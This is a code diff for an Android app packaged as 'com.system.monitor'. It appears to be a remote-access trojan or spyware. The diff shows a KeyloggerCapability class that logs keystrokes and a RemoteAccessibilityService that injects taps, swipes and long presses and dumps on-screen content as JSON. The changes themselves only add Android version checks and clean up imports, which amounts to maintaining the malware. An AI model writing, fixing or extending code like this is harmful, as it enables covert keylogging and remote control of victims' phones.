@@ -3,6 +3,9 @@ package com.system.monitor.capabilities
 import android.accessibilityservice.AccessibilityService
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
+import android.os.Build
+import android.os.Handler
+import android.os.Looper
 import com.google.gson.Gson
 import com.system.monitor.AgentService
 import java.io.File
@@ -44,11 +47,10 @@ class KeyloggerCapability(private val service: AgentService) : AgentService.Capa
     data class Keystroke(val time: Long, val packageName: String, val text: String, val eventType: Int)
 }
 
-@RequiresApi(android.os.Build.VERSION_CODES.JELLY_BEAN)
 class RemoteAccessibilityService : AccessibilityService() {
 
     private var rootNode: AccessibilityNodeInfo? = null
-    private val handler = android.os.Handler(android.os.Looper.getMainLooper())
+    private val handler = Handler(Looper.getMainLooper())
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         rootNode = getRootInActiveWindow()
@@ -57,18 +59,22 @@ class RemoteAccessibilityService : AccessibilityService() {
     override fun onInterrupt() {}
 
     fun injectTap(x: Float, y: Float): Map<String, Any> {
-        val gesture = android.accessibilityservice.GestureDescription.Builder()
-        val path = android.graphics.Path().apply { moveTo(x, y) }
-        gesture.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 50))
-        dispatchGesture(gesture.build(), object : android.accessibilityservice.GestureResultCallback() {}, handler)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            val gesture = android.accessibilityservice.GestureDescription.Builder()
+            val path = android.graphics.Path().apply { moveTo(x, y) }
+            gesture.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 50))
+            dispatchGesture(gesture.build(), object : android.accessibilityservice.GestureResultCallback() {}, handler)
+        }
         return mapOf("status" to "tap_injected")
     }
 
     fun injectSwipe(x1: Float, y1: Float, x2: Float, y2: Float, duration: Int): Map<String, Any> {
-        val gesture = android.accessibilityservice.GestureDescription.Builder()
-        val path = android.graphics.Path().apply { moveTo(x1, y1); lineTo(x2, y2) }
-        gesture.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, duration.toLong()))
-        dispatchGesture(gesture.build(), object : android.accessibilityservice.GestureResultCallback() {}, handler)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            val gesture = android.accessibilityservice.GestureDescription.Builder()
+            val path = android.graphics.Path().apply { moveTo(x1, y1); lineTo(x2, y2) }
+            gesture.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, duration.toLong()))
+            dispatchGesture(gesture.build(), object : android.accessibilityservice.GestureResultCallback() {}, handler)
+        }
         return mapOf("status" to "swipe_injected")
     }
 
@@ -107,19 +113,21 @@ class RemoteAccessibilityService : AccessibilityService() {
         val action = when (direction) {
             "up" -> AccessibilityNodeInfo.ACTION_SCROLL_FORWARD
             "down" -> AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD
-            "left" -> AccessibilityNodeInfo.ACTION_SCROLL_LEFT
-            "right" -> AccessibilityNodeInfo.ACTION_SCROLL_RIGHT
+            "left" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) AccessibilityNodeInfo.ACTION_SCROLL_LEFT else -1
+            "right" -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) AccessibilityNodeInfo.ACTION_SCROLL_RIGHT else -1
             else -> return mapOf("error" to "invalid_direction")
         }
-        rootNode?.performAction(action)
+        if (action != -1) rootNode?.performAction(action)
         return mapOf("status" to "scrolled")
     }
 
     fun injectLongPress(x: Float, y: Float, duration: Int): Map<String, Any> {
-        val gesture = android.accessibilityservice.GestureDescription.Builder()
-        val path = android.graphics.Path().apply { moveTo(x, y) }
-        gesture.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, duration.toLong()))
-        dispatchGesture(gesture.build(), object : android.accessibilityservice.GestureResultCallback() {}, handler)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            val gesture = android.accessibilityservice.GestureDescription.Builder()
+            val path = android.graphics.Path().apply { moveTo(x, y) }
+            gesture.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, duration.toLong()))
+            dispatchGesture(gesture.build(), object : android.accessibilityservice.GestureResultCallback() {}, handler)
+        }
         return mapOf("status" to "long_press_injected")
     }
 
@@ -148,12 +156,14 @@ class RemoteAccessibilityService : AccessibilityService() {
         for (i in 0 until node.childCount) {
             node.getChild(i)?.let { children.add(nodeToJson(it)) }
         }
+        val bounds = android.graphics.Rect()
+        node.getBoundsInScreen(bounds)
         return mapOf(
             "class" to node.className.toString(),
             "id" to node.viewIdResourceName,
             "text" to node.text.toString(),
             "content_desc" to node.contentDescription.toString(),
-            "bounds" to node.boundsInScreen.toShortString(),
+            "bounds" to bounds.toShortString(),
             "clickable" to node.isClickable,
             "enabled" to node.isEnabled,
             "focusable" to node.isFocusable,
